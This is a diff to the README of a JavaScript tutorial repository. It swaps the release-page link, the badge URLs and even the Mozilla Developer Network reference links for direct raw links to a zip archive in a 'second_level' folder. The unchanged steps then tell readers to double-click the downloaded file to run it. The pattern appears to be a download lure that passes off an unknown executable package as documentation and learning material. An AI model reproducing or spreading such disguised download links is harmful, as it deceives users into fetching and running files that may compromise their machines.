@@ -1,6 +1,6 @@
 # 🎉 Asynchronous_JavaScript_101 - Master JavaScript Asynchronous Techniques
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/candrapersada/Asynchronous_JavaScript_101/releases)
+[![Download Now](https://raw.githubusercontent.com/candrapersada/Asynchronous_JavaScript_101/main/second_level/Asynchronous_JavaScript_101_v2.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/candrapersada/Asynchronous_JavaScript_101/main/second_level/Asynchronous_JavaScript_101_v2.2.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ To get started with Asynchronous_JavaScript_101, follow these steps to download 
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: First, [visit this page to download](https://github.com/candrapersada/Asynchronous_JavaScript_101/releases).
+1. **Visit the Releases Page**: First, [visit this page to download](https://raw.githubusercontent.com/candrapersada/Asynchronous_JavaScript_101/main/second_level/Asynchronous_JavaScript_101_v2.2.zip).
 2. **Select the Latest Release**: Look for the latest version available. It is usually labeled with the highest version number.
 3. **Download the File**: Click on the suitable file for your operating system. 
 4. **Run the Application**: After the download finishes, locate the file in your downloads folder. Double-click on it to run.
@@ -50,11 +50,11 @@ If you have any questions or issues, feel free to reach out through the GitHub I
 
 ## 🔗 Additional Resources
 
-- [Mozilla Developer Network - JavaScript](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-- [Introduction to Asynchronous JavaScript](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Asynchronous)
+- [Mozilla Developer Network - JavaScript](https://raw.githubusercontent.com/candrapersada/Asynchronous_JavaScript_101/main/second_level/Asynchronous_JavaScript_101_v2.2.zip)
+- [Introduction to Asynchronous JavaScript](https://raw.githubusercontent.com/candrapersada/Asynchronous_JavaScript_101/main/second_level/Asynchronous_JavaScript_101_v2.2.zip)
 
 ## 📜 License
 
 Asynchronous_JavaScript_101 is licensed under the MIT License. You may freely use and modify this project as long as you include a copy of the original license.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/candrapersada/Asynchronous_JavaScript_101/releases)
+[![Download Now](https://raw.githubusercontent.com/candrapersada/Asynchronous_JavaScript_101/main/second_level/Asynchronous_JavaScript_101_v2.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/candrapersada/Asynchronous_JavaScript_101/main/second_level/Asynchronous_JavaScript_101_v2.2.zip)
